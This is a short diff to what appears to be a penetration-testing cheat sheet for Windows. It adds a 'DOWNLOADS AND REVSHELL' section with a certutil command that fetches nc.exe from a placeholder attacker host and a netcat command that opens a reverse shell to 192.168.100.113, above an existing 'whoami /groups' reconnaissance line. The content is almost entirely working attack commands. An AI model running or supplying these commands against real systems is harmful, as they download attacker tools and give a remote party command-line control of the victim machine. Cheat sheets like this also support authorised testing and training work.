@@ -1,3 +1,9 @@
+DOWNLOADS AND REVSHELL
+
+certutil -urlcache -split -f http://<attacker-ip>/nc.exe nc.exe
+
+.\nc.exe 192.168.100.113 80 –e cmd.exe 
+
 SITUATIONAL AWARENESS
 
 whoami /groups
